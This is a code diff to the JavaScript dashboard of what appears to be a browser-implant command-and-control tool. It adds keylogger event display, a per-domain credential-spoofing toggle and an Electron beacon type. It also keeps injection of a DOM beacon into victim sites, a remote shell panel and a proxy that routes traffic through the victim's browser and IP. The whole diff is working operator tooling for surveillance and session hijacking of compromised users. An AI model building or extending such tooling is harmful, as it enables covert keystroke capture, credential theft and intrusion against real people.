                                         <input type="file" class="form-control form-control-sm" id="sidecar-upload-file" style="max-width:250px;">
-                                        <button class="btn btn-outline-danger btn-sm" onclick="sidecarUploadFile('${id}')">Upload</button>
+                                        <button class="btn btn-outline-secondary btn-sm" onclick="sidecarUploadFile('${id}')">Upload</button>
                                     </div>
                                     <div id="sidecar-upload-status"></div>
                                     <div id="sidecar-file-results" style="max-height: 400px; overflow-y: auto;"></div>
@@ -3537,17 +3728,18 @@ async function getClientDetails(id)
                                 <div class="tab-pane fade" id="sidecar-shell">
                                     <div id="sidecar-shell-output" style="background:#1e1e1e; color:#ddd; font-family:monospace; font-size:13px; max-height:400px; overflow-y:auto; padding:8px 10px; border-radius:4px; margin-bottom:8px;"></div>
                                     <div class="input-group">
-                                        <span class="input-group-text bg-dark text-success border-secondary" id="sidecar-shell-prompt" style="font-family:monospace; font-size:13px;">~ $ </span>
+                                        <span class="input-group-text bg-dark text-white border-secondary" id="sidecar-shell-prompt" style="font-family:monospace; font-size:13px;">~ $ </span>
                                         <input type="text" class="form-control form-control-sm bg-dark text-white border-secondary" id="sidecar-shell-input" style="font-family:monospace;" placeholder="type a command..." onkeydown="sidecarShellKeyHandler(event, '${id}')">
-                                        <button class="btn btn-outline-success btn-sm" onclick="sidecarShellExec('${id}')">Run</button>
+                                        <button class="btn btn-primary btn-sm" onclick="sidecarShellExec('${id}')">Run</button>
                                         <button class="btn btn-outline-secondary btn-sm" onclick="sidecarPopOutShell('${id}')" title="Pop out shell into separate window">Pop Out</button>
                                     </div>
                                 </div>
+                                ${screenshotPaneHtml}
                             </div>
                         </div>
                         </div>
                     `;
-                    cardStack.prepend(sidecarPanel);
+                    toolsStack.appendChild(sidecarPanel);
 
                     // Chevron rotation on collapse/expand
                     var collapseEl = document.getElementById('sidecar-collapse');
@@ -3567,11 +3759,32 @@ async function getClientDetails(id)
                             sidecarBrowse(id);
                         });
                     }
+                } else {
+                    // Panel exists — update the badge on refresh
+                    var existingBadge = sidecarPanel.querySelector('#sidecar-badge');
+                    if (existingBadge && !isAtomBeacon) {
+                        // Only update connection state for bex-beacon (sidecar binary)
+                        if (client.sidecarConnected) {
+                            existingBadge.className = 'badge bg-success';
+                            existingBadge.textContent = 'Connected';
+                        } else {
+                            existingBadge.className = 'badge bg-info';
+                            existingBadge.textContent = 'Supported';
+                        }
+                    }
                 }
             }
 
-            // Proxy panel
-            try { await renderProxyPanel(cardStack, id, client); } catch(e) { console.error('Proxy panel error:', e); }
+            // Proxy panel -> tools stack (rendered first, above sidecar; browser-extension only)
+            var proxyState = { isActive: false, spoofConfig: {} };
+            if (client.clientType === 'bex-beacon') {
+                try { proxyState = await renderProxyPanel(toolsStack, id, client) || proxyState; } catch(e) { console.error('Proxy panel error:', e); }
+            }
+
+            // Atom-beacon uses app-style event timeline, not domain view
+            if (client.clientType === 'atom-beacon') {
+                // Close the beacon block — fall through to app-style event view below
+            } else {
 
             var domainsReq = await fetch('/api/bex/domains/' + id);
             var domains = await domainsReq.json();
@@ -3585,7 +3798,7 @@ async function getClientDetails(id)
             // Get all clients to find children
             var children = clients.filter(c => c.parentUUID === client.uuid);
 
-            if (domains.length === 0 && !client.sidecarAvailable) {
+            if (domains.length === 0) {
                 // Only insert placeholder if not already present (avoids duplication on refresh)
                 if (!cardStack.querySelector('#bex-no-domains-placeholder')) {
                     cardStack.innerHTML = `
@@ -3595,6 +3808,7 @@ async function getClientDetails(id)
                         </div>
                     `;
                 }
+                switchBexTab(activeBexTab);
                 return;
             }
 
@@ -3624,7 +3838,7 @@ async function getClientDetails(id)
                         <div class="card-body">
                             <div class="header-area d-flex justify-content-between align-items-center mb-2"></div>
                             <div class="stats-area mb-2 text-muted small"></div>
-                            <div class="controls-area d-flex justify-content-start gap-2 mb-3"></div>
+                            <div class="controls-area d-flex justify-content-start align-items-center gap-2 mb-3"></div>
                             <div class="children-area"></div>
                             <div class="details-area mt-3" style="display: none;" id="domain-details-${d.id}"></div>
                         </div>
@@ -3655,8 +3869,8 @@ async function getClientDetails(id)
                     (d.lastUrl ? ` &bull; Last URL: <span class="text-truncate d-inline-block" style="max-width: 300px; vertical-align: bottom;" title="${escapeHTML(d.lastUrl)}">${escapeHTML(d.lastUrl)}</span>` : '');
 
                 // 3. Update Controls (Only if state changed or new)
-                const currentActionText = activeMap[d.domain] ? 'Stop Injection' : 'Inject JS-Tap';
-                const currentActionClass = activeMap[d.domain] ? 'btn-outline-danger' : 'btn-outline-success';
+                const currentActionText = activeMap[d.domain] ? 'Stop Injection' : 'Inject DOM Beacon';
+                const currentActionClass = activeMap[d.domain] ? 'btn-secondary' : 'btn-primary';
                 
                 if (isNew || !controlsArea.querySelector(`.${currentActionClass}`)) {
                     controlsArea.innerHTML = '';
@@ -3668,12 +3882,12 @@ async function getClientDetails(id)
                     injectBtn.onclick = function() { toggleBexInjection(id, d.domain, !!activeMap[d.domain]); };
                     controlsArea.appendChild(injectBtn);
 
-                    const ticketBtn = document.createElement('button');
-                    ticketBtn.style.minWidth = "120px";
-                    ticketBtn.className = 'btn btn-outline-info btn-sm';
-                    ticketBtn.innerHTML = '<i class="bi bi-clipboard-check"></i> BEX Ticket';
-                    ticketBtn.onclick = function() { generateBexTicket(d.id); };
-                    controlsArea.appendChild(ticketBtn);
+                    const cloneTicketBtn = document.createElement('button');
+                    cloneTicketBtn.style.minWidth = "120px";
+                    cloneTicketBtn.className = 'btn btn-primary btn-sm';
+                    cloneTicketBtn.textContent = 'Clone Ticket';
+                    cloneTicketBtn.onclick = function() { generateBexTicket(d.id); };
+                    controlsArea.appendChild(cloneTicketBtn);
 
                     const captureBtn = document.createElement('button');
                     captureBtn.style.minWidth = "120px";
@@ -3681,6 +3895,41 @@ async function getClientDetails(id)
                     captureBtn.textContent = 'View Details';
                     captureBtn.onclick = function() { toggleDomainDetails(d.id, this); };
                     controlsArea.appendChild(captureBtn);
+
+                    // Spoof Creds toggle (pushed to right)
+                    const spoofWrap = document.createElement('div');
+                    spoofWrap.className = 'form-check form-switch mb-0 ms-auto';
+                    const spoofInput = document.createElement('input');
+                    spoofInput.className = 'form-check-input spoof-creds-toggle';
+                    spoofInput.type = 'checkbox';
+                    spoofInput.setAttribute('data-domain', d.domain);
+                    spoofInput.checked = !!proxyState.spoofConfig[d.domain];
+                    spoofInput.disabled = !proxyState.isActive;
+                    spoofInput.id = 'spoof-card-' + d.domain.replace(/[^a-zA-Z0-9]/g, '-');
+                    spoofInput.addEventListener('change', async function() {
+                        var domain = this.getAttribute('data-domain');
+                        var enabled = this.checked;
+                        await fetch('/api/proxy/spoof', {
+                            method: 'POST',
+                            body: JSON.stringify({ beaconID: id, domain: domain, enabled: enabled }),
+                            headers: { "Content-type": "application/json; charset=UTF-8" }
+                        });
+                        showToast((enabled ? 'Spoofing enabled for ' : 'Spoofing disabled for ') + domain);
+                    });
+                    const spoofLabel = document.createElement('label');
+                    spoofLabel.className = 'form-check-label small text-muted';
+                    spoofLabel.setAttribute('for', spoofInput.id);
+                    spoofLabel.textContent = 'Proxy Credential Spoofing';
+                    spoofWrap.appendChild(spoofInput);
+                    spoofWrap.appendChild(spoofLabel);
+                    controlsArea.appendChild(spoofWrap);
+                }
+
+                // Update spoof toggle state on every refresh
+                const spoofToggle = controlsArea.querySelector('.spoof-creds-toggle');
+                if (spoofToggle) {
+                    spoofToggle.checked = proxyState.isActive && !!proxyState.spoofConfig[d.domain];
+                    spoofToggle.disabled = !proxyState.isActive;
                 }
 
                 // 4. Update Children Summary
@@ -3717,22 +3966,60 @@ async function getClientDetails(id)
             if (scrollPos > 0) {
                 cardStack.scrollTop = scrollPos;
             }
+
+            // Enforce tab visibility
+            switchBexTab(activeBexTab);
             return;
+            } // end bex-beacon domain view else block
         }
 
-        // Get high level event stack for client (Standard Implant)
+        // Get high level event stack for client (Standard Implant / Atom Beacon)
         var req = await fetch('/api/clientEvents/' + id);
         var jsonResponse = await req.json();
 
-        // Apply loot sort order (API returns oldest first)
-        if (document.getElementById('lootSortNewest').checked) {
-            jsonResponse.reverse();
+        // Determine which events to render
+        var newestFirst = document.getElementById('lootSortNewest').checked;
+        var lastMaxEventId = cardStack._lastMaxEventId || 0;
+        var newEvents;
+
+        if (autoRefresh && isRefresh && lastMaxEventId > 0) {
+            // Auto-refresh: only render events newer than what we already have
+            newEvents = jsonResponse.filter(e => e.id > lastMaxEventId);
+            if (newEvents.length === 0) {
+                // Nothing new — skip entirely, preserve scroll
+                if (client && client.clientType === 'atom-beacon') {
+                    switchBexTab(activeBexTab);
+                }
+                return;
+            }
+            // Sort new events for display
+            if (newestFirst) {
+                newEvents.reverse();
+            }
+        } else {
+            // Full render: manual click or first load
+            if (newestFirst) {
+                jsonResponse.reverse();
+            }
+            newEvents = jsonResponse;
+
+            // Clear existing cards
+            while (cardStack.firstChild) {
+                cardStack.firstChild.remove();
+            }
         }
 
-        // Let's get event details for each event
-        for (let i = 0; i < jsonResponse.length; i++)
+        // Track max event ID across all events (not just new ones)
+        var maxId = 0;
+        for (var ei = 0; ei < jsonResponse.length; ei++) {
+            if (jsonResponse[ei].id > maxId) maxId = jsonResponse[ei].id;
+        }
+        cardStack._lastMaxEventId = maxId;
+
+        // Render new event cards
+        for (let i = 0; i < newEvents.length; i++)
         {
-            event = jsonResponse[i];
+            event = newEvents[i];
             var eventKey = event.eventID;
 
             var card = document.createElement('div');
@@ -3921,6 +4208,24 @@ async function getClientDetails(id)
             }
             break;
 
+        case 'KEYLOG':
+            if (document.getElementById('keylogEvents').checked == true)
+            {
+                activeEvent = true;
+                keylogReq  = await fetch('/api/clientKeylog/' + eventKey);
+                keylogJson = await keylogReq.json();
+
+                cardTitle.innerHTML = "Keylog";
+                cardText.innerHTML  = "Target: <b>" + escapeHTML(keylogJson.target) + "</b>";
+                cardText.innerHTML += "<br>";
+                cardText.innerHTML += "Keystrokes: <b>" + escapeHTML(keylogJson.keys) + "</b>";
+                if (keylogJson.url) {
+                    cardText.innerHTML += "<br>";
+                    cardText.innerHTML += "URL: <b>" + escapeHTML(keylogJson.url) + "</b>";
+                }
+            }
+            break;
+
         default:
             console.log("Error: unknown event type received from server: " + event.eventType);
         }
@@ -3935,12 +4240,19 @@ async function getClientDetails(id)
             cardBody.appendChild(cardText);
 
             card.appendChild(cardBody);
-            cardStack.appendChild(card);
+
+            // Auto-refresh with newest-first: prepend new events at top
+            if (autoRefresh && isRefresh && newestFirst && cardStack.firstChild) {
+                cardStack.insertBefore(card, cardStack.firstChild);
+            } else {
+                cardStack.appendChild(card);
+            }
         }
         }
-        // Restore scroll position
-        if (scrollPos > 0) {
-            cardStack.scrollTop = scrollPos;
+
+        // Atom-beacon has sidecar tools — enforce tab visibility
+        if (client && client.clientType === 'atom-beacon') {
+            switchBexTab(activeBexTab);
         }
     } finally {
         refreshingDetails = false;
@@ -3958,99 +4270,50 @@ async function getClientDetails(id)
 async function renderProxyPanel(cardStack, beaconId, client) {
     let panel = document.getElementById('proxy-panel');
 
-    // Preserve collapse state across re-renders
-    var wasExpanded = false;
-    if (panel) {
-        var existingCollapse = panel.querySelector('#proxy-collapse');
-        if (existingCollapse) {
-            wasExpanded = existingCollapse.classList.contains('show');
-        }
-    }
-
-    // Fetch current proxy status
-    var statusResp = await fetch('/api/proxy/status');
+    // Fetch proxy status for this specific beacon
+    var statusResp = await fetch('/api/proxy/status?beaconID=' + encodeURIComponent(beaconId));
     var proxyStatus = await statusResp.json();
 
-    var isThisBeaconActive = proxyStatus.running && proxyStatus.beaconID === client.uuid;
+    var isActive = proxyStatus.running;
     var wsConnected = proxyStatus.wsConnected;
+    var proxyPort = proxyStatus.port;
 
     if (!panel) {
         panel = document.createElement('div');
         panel.id = 'proxy-panel';
-        panel.className = 'card mb-3 border-info';
-        cardStack.appendChild(panel);
+        panel.className = 'card mb-3 border-secondary';
+        cardStack.prepend(panel);
     }
 
     // Status badge
     var statusBadge = '';
-    if (isThisBeaconActive) {
+    if (isActive) {
         if (wsConnected) {
             statusBadge = '<span class="badge bg-success">Connected</span>';
         } else {
             statusBadge = '<span class="badge bg-warning text-dark">Waiting for beacon...</span>';
         }
-    } else if (proxyStatus.running) {
-        statusBadge = '<span class="badge bg-secondary">Active on another beacon</span>';
     }
 
-    // Build domain spoofing toggles if proxy is active for this beacon
-    var spoofHtml = '';
-    if (isThisBeaconActive) {
-        var domainsReq = await fetch('/api/bex/domains/' + beaconId);
-        var domains = await domainsReq.json();
-        var spoofConfig = proxyStatus.spoofConfig || {};
-
-        if (domains.length > 0) {
-            spoofHtml = '<div class="mt-2"><small class="text-muted">Credential spoofing per domain:</small>';
-            spoofHtml += '<div class="list-group list-group-flush mt-1">';
-            for (var d of domains) {
-                var isOn = !!spoofConfig[d.domain];
-                var checkId = 'spoof-' + d.domain.replace(/[^a-zA-Z0-9]/g, '-');
-                spoofHtml += '<div class="list-group-item bg-dark text-white d-flex justify-content-between align-items-center py-1 px-2">';
-                spoofHtml += '<small>' + escapeHTML(d.domain) + '</small>';
-                spoofHtml += '<div class="form-check form-switch mb-0">';
-                spoofHtml += '<input class="form-check-input proxy-spoof-toggle" type="checkbox" id="' + checkId + '" data-domain="' + escapeHTML(d.domain) + '"' + (isOn ? ' checked' : '') + '>';
-                spoofHtml += '</div></div>';
-            }
-            spoofHtml += '</div></div>';
-        }
-    }
+    var spoofConfig = proxyStatus.spoofConfig || {};
 
     panel.innerHTML = `
-        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer;" data-bs-toggle="collapse" data-bs-target="#proxy-collapse" aria-expanded="${wasExpanded ? 'true' : 'false'}" aria-controls="proxy-collapse">
+        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
             <span><b>Browser Proxy</b> ${statusBadge}</span>
-            <svg id="proxy-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(${wasExpanded ? '0deg' : '-90deg'});">
-                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
-            </svg>
         </div>
-        <div class="collapse${wasExpanded ? ' show' : ''}" id="proxy-collapse">
         <div class="card-body p-3">
             <p class="small text-muted mb-2">Route your browser traffic through this beacon. Requests are fetched from the victim's browser/IP via WebSocket.</p>
             <div class="d-flex gap-2 align-items-center mb-2">
-                ${isThisBeaconActive
-                    ? '<button class="btn btn-outline-danger btn-sm" id="proxy-stop-btn">Stop Proxy</button>'
-                    : '<button class="btn btn-outline-success btn-sm" id="proxy-start-btn"' + (proxyStatus.running ? ' disabled title="Proxy active on another beacon"' : '') + '>Start Proxy</button>'
+                ${isActive
+                    ? '<button class="btn btn-secondary btn-sm" id="proxy-stop-btn">Stop Proxy</button>'
+                    : '<button class="btn btn-primary btn-sm" id="proxy-start-btn">Start Proxy</button>'
                 }
-                ${isThisBeaconActive ? '<span class="small text-info">Proxy: <b>127.0.0.1:8445</b></span>' : ''}
-                ${isThisBeaconActive ? '<button class="btn btn-outline-info btn-sm" onclick="downloadCaCert()">Download CA Cert</button>' : ''}
+                ${isActive ? '<button class="btn btn-primary btn-sm" onclick="downloadCaCert()">Download CA Cert</button>' : ''}
+                ${isActive ? '<button class="btn btn-primary btn-sm" onclick="generateProxyTicket(\'' + beaconId + '\')">Proxy Ticket</button>' : ''}
+                ${isActive && proxyPort ? '<span class="small text-muted ms-auto">Port: <b>' + proxyPort + '</b></span>' : ''}
             </div>
-            ${spoofHtml}
-        </div>
         </div>
     `;
-
-    // Collapse chevron animation
-    var collapseEl = panel.querySelector('#proxy-collapse');
-    if (collapseEl) {
-        collapseEl.addEventListener('hide.bs.collapse', function() {
-            var chev = document.getElementById('proxy-chevron');
-            if (chev) chev.style.transform = 'rotate(-90deg)';
-        });
-        collapseEl.addEventListener('show.bs.collapse', function() {
-            var chev = document.getElementById('proxy-chevron');
-            if (chev) chev.style.transform = 'rotate(0deg)';
-        });
-    }
 
     // Wire up start/stop buttons
     var startBtn = document.getElementById('proxy-start-btn');
@@ -4058,12 +4321,13 @@ async function renderProxyPanel(cardStack, beaconId, client) {
         startBtn.onclick = async function() {
             startBtn.disabled = true;
             startBtn.textContent = 'Starting...';
-            await fetch('/api/proxy/start', {
+            var resp = await fetch('/api/proxy/start', {
                 method: 'POST',
                 body: JSON.stringify({ beaconID: beaconId }),
                 headers: { "Content-type": "application/json; charset=UTF-8" }
             });
-            showToast('Proxy started — configure browser to use 127.0.0.1:8445');
+            var data = await resp.json();
+            showToast('Proxy started on port ' + (data.port || '?'));
             getClientDetails(beaconId);
         };
     }
@@ -4073,25 +4337,17 @@ async function renderProxyPanel(cardStack, beaconId, client) {
         stopBtn.onclick = async function() {
             stopBtn.disabled = true;
             stopBtn.textContent = 'Stopping...';
-            await fetch('/api/proxy/stop', { method: 'POST', headers: { "Content-type": "application/json; charset=UTF-8" } });
+            await fetch('/api/proxy/stop', {
+                method: 'POST',
+                body: JSON.stringify({ beaconID: beaconId }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
             showToast('Proxy stopped');
             getClientDetails(beaconId);
         };
     }
 
-    // Wire up spoof toggles
-    panel.querySelectorAll('.proxy-spoof-toggle').forEach(function(toggle) {
-        toggle.addEventListener('change', async function() {
-            var domain = this.getAttribute('data-domain');
-            var enabled = this.checked;
-            await fetch('/api/proxy/spoof', {
-                method: 'POST',
-                body: JSON.stringify({ domain: domain, enabled: enabled }),
-                headers: { "Content-type": "application/json; charset=UTF-8" }
-            });
-            showToast((enabled ? 'Spoofing enabled for ' : 'Spoofing disabled for ') + domain);
-        });
-    });
+    return { isActive: isActive, spoofConfig: spoofConfig };
 }
 
 
@@ -4106,6 +4362,15 @@ function unselectAllClients()
 		detailCardStack.firstChild.remove();
 	}
 
+	// Clear tools stack
+	var toolsStack = document.getElementById('tools-stack');
+	if (toolsStack) {
+		while (toolsStack.firstChild) toolsStack.firstChild.remove();
+		toolsStack.style.display = 'none';
+	}
+
+	removeBeaconHeaderToggle();
+
 	// Unselect client cards
 	clientCardStack = document.getElementById('client-stack');
 	var cards = clientCardStack.querySelectorAll('.card');
@@ -4115,6 +4380,94 @@ function unselectAllClients()
 	}
 }
 
+
+function switchBexTab(tab) {
+	activeBexTab = tab;
+	var detailStack = document.getElementById('detail-stack');
+	var toolsStack = document.getElementById('tools-stack');
+	var toolbarButtons = document.getElementById('loot-toolbar-buttons');
+
+	if (tab === 'tools') {
+		detailStack.style.display = 'none';
+		toolsStack.style.display = '';
+		if (toolbarButtons) toolbarButtons.style.display = 'none';
+	} else {
+		detailStack.style.display = '';
+		toolsStack.style.display = 'none';
+		if (toolbarButtons) toolbarButtons.style.display = '';
+	}
+}
+
+
+function setupBeaconHeaderToggle(label) {
+	var headerArea = document.getElementById('loot-header-area');
+	var headerText = document.getElementById('loot-header-text');
+	if (!headerArea) return;
+
+	// Update the plain text label
+	if (headerText) {
+		headerText.innerHTML = '<b>&nbsp;&nbsp;' + label + '</b>';
+		headerText.style.display = '';
+	}
+
+	// Don't recreate if already present
+	if (document.getElementById('bex-loot-tools-toggle')) {
+		// Just ensure correct radio is checked
+		var lootRadio = document.getElementById('toggleLootTab');
+		var toolsRadio = document.getElementById('toggleToolsTab');
+		if (lootRadio) lootRadio.checked = (activeBexTab === 'loot');
+		if (toolsRadio) toolsRadio.checked = (activeBexTab === 'tools');
+		return;
+	}
+
+	var toggleGroup = document.createElement('div');
+	toggleGroup.id = 'bex-loot-tools-toggle';
+	toggleGroup.className = 'btn-group';
+	toggleGroup.setAttribute('role', 'group');
+	toggleGroup.setAttribute('aria-label', 'Loot Tools Toggle');
+	toggleGroup.style.marginTop = '6px';
+
+	toggleGroup.innerHTML = `
+		<input type="radio" class="btn-check" name="lootToolsToggle" id="toggleLootTab" autocomplete="off" ${activeBexTab === 'loot' ? 'checked' : ''}>
+		<label class="btn btn-type-toggle btn-sm" for="toggleLootTab">Loot</label>
+		<input type="radio" class="btn-check" name="lootToolsToggle" id="toggleToolsTab" autocomplete="off" ${activeBexTab === 'tools' ? 'checked' : ''}>
+		<label class="btn btn-type-toggle btn-sm" for="toggleToolsTab">Tools</label>
+	`;
+
+	headerArea.appendChild(toggleGroup);
+
+	document.getElementById('toggleLootTab').addEventListener('click', function() { switchBexTab('loot'); });
+	document.getElementById('toggleToolsTab').addEventListener('click', function() { switchBexTab('tools'); });
+
+	// Enforce current tab state
+	switchBexTab(activeBexTab);
+}
+
+
+function removeBeaconHeaderToggle() {
+	var toggle = document.getElementById('bex-loot-tools-toggle');
+	if (toggle) toggle.remove();
+
+	var headerText = document.getElementById('loot-header-text');
+	if (headerText) headerText.style.display = '';
+
+	activeBexTab = 'loot';
+
+	// Reset visibility
+	var detailStack = document.getElementById('detail-stack');
+	var toolsStack = document.getElementById('tools-stack');
+	var toolbarButtons = document.getElementById('loot-toolbar-buttons');
+	if (detailStack) detailStack.style.display = '';
+	if (toolsStack) toolsStack.style.display = 'none';
+	if (toolbarButtons) toolbarButtons.style.display = '';
+}
+
+
+function getActiveClientType() {
+    if (document.getElementById('toggleBrowsers').checked) return 'browsers';
+    if (document.getElementById('toggleElectrons').checked) return 'electrons';
+    return 'apps';
+}
 
 
 function parseDate(dateString)
@@ -4275,31 +4628,34 @@ async function updateClients()
 	var fingerprintJson = await fingerprintReq.json();
 
     // Update Navbar Stats
-    const appCount = clientsJson.filter(c => c.clientType !== 'bex-beacon').length;
+    const appCount = clientsJson.filter(c => c.clientType === 'js-implant' || (!c.clientType)).length;
     const browserCount = clientsJson.filter(c => c.clientType === 'bex-beacon').length;
+    const electronCount = clientsJson.filter(c => c.clientType === 'atom-beacon').length;
     const statsEl = document.getElementById('client-stats');
     if (statsEl) {
-        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b>`;
+        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b> &nbsp;|&nbsp; Electrons: <b>${electronCount}</b>`;
 
         // Detect new arrivals (skip first load when _prev is -1)
         var newApp = _prevAppCount >= 0 && appCount > _prevAppCount;
         var newBrowser = _prevBrowserCount >= 0 && browserCount > _prevBrowserCount;
-        if (newApp || newBrowser) {
+        var newElectron = _prevElectronCount >= 0 && electronCount > _prevElectronCount;
+        if (newApp || newBrowser || newElectron) {
             // Animate stats
-            statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser');
+            statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser', 'stats-flash-electron');
             void statsEl.offsetWidth; // force reflow to restart animation
-            statsEl.classList.add(newApp ? 'stats-flash-app' : 'stats-flash-browser');
+            statsEl.classList.add(newApp ? 'stats-flash-app' : newBrowser ? 'stats-flash-browser' : 'stats-flash-electron');
             statsEl.addEventListener('animationend', function handler() {
-                statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser');
+                statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser', 'stats-flash-electron');
                 statsEl.removeEventListener('animationend', handler);
             });
 
             // Play chime
             if (newApp) playChime('app');
-            else playChime('browser');
+            else playChime('browser'); // reuse browser chime for electrons
         }
         _prevAppCount = appCount;
         _prevBrowserCount = browserCount;
+        _prevElectronCount = electronCount;
     }
 
 	// Start setting up the client cards
@@ -4325,16 +4681,21 @@ async function updateClients()
 	// Sort the clients
 	var jsonResponse = await sortClients(clientsJson);
 
-    const showBeacons = document.getElementById('toggleBrowsers').checked;
+    const activeType = getActiveClientType();
 
     // Always show loot options button (sort applies to both app and browser loot)
 
     // Auto-Select Logic: When switching types, load the last selected client of that type
     // Use loose equality (==) because selectedClientId may be a string from getAttribute
     // while lastSelected*Id may be a number from JSON
-    if (showBeacons) {
+    if (activeType === 'browsers') {
         if (selectedClientId != lastSelectedBrowserId) {
             selectedClientId = lastSelectedBrowserId;
+            if (selectedClientId) getClientDetails(selectedClientId);
+        }
+    } else if (activeType === 'electrons') {
+        if (selectedClientId != lastSelectedElectronId) {
+            selectedClientId = lastSelectedElectronId;
             if (selectedClientId) getClientDetails(selectedClientId);
         }
     } else {
@@ -4347,29 +4708,24 @@ async function updateClients()
     // Auto-refresh detail view if a beacon is selected (to update injection status)
     if (selectedClientId && !refreshingDetails) {
         const selectedClient = clientsJson.find(c => c.id == selectedClientId);
-        if (selectedClient && selectedClient.clientType === 'bex-beacon') {
-            getClientDetails(selectedClientId);
+        if (selectedClient && (selectedClient.clientType === 'bex-beacon' || selectedClient.clientType === 'atom-beacon')) {
+            getClientDetails(selectedClientId, true);
         }
     }
 
 	// We need to filter the clients here too
 	jsonResponse = filterClients(jsonResponse);
 
-    // Handle Loot Header based on Selected Client (factually representing what's shown)
+    // Handle Loot Header based on Selected Client
     const lootHeader = document.getElementById('loot-header-text');
-    
-    if (selectedClientId) {
-        // Find the selected client in the FULL list
-        const selectedClient = clientsJson.find(c => c.id == selectedClientId);
-        if (selectedClient && lootHeader) {
-            const label = selectedClient.clientType === 'bex-beacon' ? "Browser Loot" : "App Loot";
-            lootHeader.innerHTML = `<b>&nbsp;&nbsp;${label}</b>`;
-        }
-	} else {
-        // No selection
-        if (lootHeader) {
-            lootHeader.innerHTML = showBeacons ? "<b>&nbsp;&nbsp;Browser Loot</b>" : "<b>&nbsp;&nbsp;App Loot</b>";
-        }
+
+    if (activeType === 'browsers') {
+        setupBeaconHeaderToggle('Browser');
+    } else if (activeType === 'electrons') {
+        setupBeaconHeaderToggle('Electron');
+    } else {
+        removeBeaconHeaderToggle();
+        if (lootHeader) lootHeader.innerHTML = '<b>&nbsp;&nbsp;App Loot</b>';
     }
 
 	var topCount = parseInt(clientLoadCount) + parseInt(clientLoadExtraCount);
@@ -4387,9 +4743,10 @@ async function updateClients()
 		client = jsonResponse[i];
 
 		// Filter by client type toggle
-		const showBeacons = document.getElementById('toggleBrowsers').checked;
-		if (showBeacons && client.clientType !== 'bex-beacon') continue;
-		if (!showBeacons && client.clientType === 'bex-beacon') continue;
+		const activeType2 = getActiveClientType();
+		if (activeType2 === 'browsers' && client.clientType !== 'bex-beacon') continue;
+		if (activeType2 === 'electrons' && client.clientType !== 'atom-beacon') continue;
+		if (activeType2 === 'apps' && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon')) continue;
 
 		if (document.getElementById('onlyStarredClients').checked == true)
 		{
@@ -4494,7 +4851,7 @@ async function updateClients()
   cardText.innerHTML += "<br>Platform:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.platform) + "</b><br>";
   cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.browser) + "</b>";
 
-  if (client.clientType !== 'bex-beacon') {
+  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon') {
     if (client.hasJobs)
     {
       cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
@@ -4511,7 +4868,7 @@ async function updateClients()
   cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
   cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";
 
-  if (client.clientType !== 'bex-beacon' && client.domain) {
+  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon' && client.domain) {
       cardSubtitle.innerHTML += "<br>Domain: <b>" + escapeHTML(client.domain) + "</b>";
   }
 
@@ -4520,7 +4877,7 @@ async function updateClients()
   cardBody.appendChild(cardText);
 
   // Add child client summary if it's a beacon
-  if (client.clientType === 'bex-beacon') {
+  if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
       const myChildren = clientsJson.filter(c => c.parentUUID === client.uuid);
       if (myChildren.length > 0) {
           var childrenDiv = document.createElement('div');
@@ -4742,6 +5099,7 @@ var _lootSearchBadgeColors = {
 	'XHRAPICALL': 'dark',
 	'FETCHAPICALL': 'dark',
 	'CUSTOMEXFIL': 'light',
+	'KEYLOG': 'warning',
 	'BEACON_CAPTURE': 'success',
 	'BEACON_VISIT': 'primary'
 };
@@ -4756,6 +5114,7 @@ var _lootSearchTypeLabels = {
 	'XHRAPICALL': 'XHR',
 	'FETCHAPICALL': 'Fetch',
 	'CUSTOMEXFIL': 'Custom Exfil',
+	'KEYLOG': 'Keylog',
 	'BEACON_CAPTURE': 'Beacon Capture',
 	'BEACON_VISIT': 'Beacon Visit'
 };
@@ -4809,7 +5168,7 @@ function renderLootSearchResults(data)
 		var clientLabel = '';
 		if (r.clientTag) clientLabel = r.clientTag + '/';
 		clientLabel += r.clientNickname;
-		var clientTypeIcon = r.clientType === 'bex-beacon' ? ' [bex]' : '';
+		var clientTypeIcon = r.clientType === 'bex-beacon' ? ' [bex]' : r.clientType === 'atom-beacon' ? ' [atom]' : '';
 		var line2 = '<div><small>Client: <b>' + escapeHtmlSearch(clientLabel) + '</b>';
 		if (r.clientIP) line2 += ' (' + escapeHtmlSearch(r.clientIP) + ')';
 		line2 += escapeHtmlSearch(clientTypeIcon) + '</small></div>';
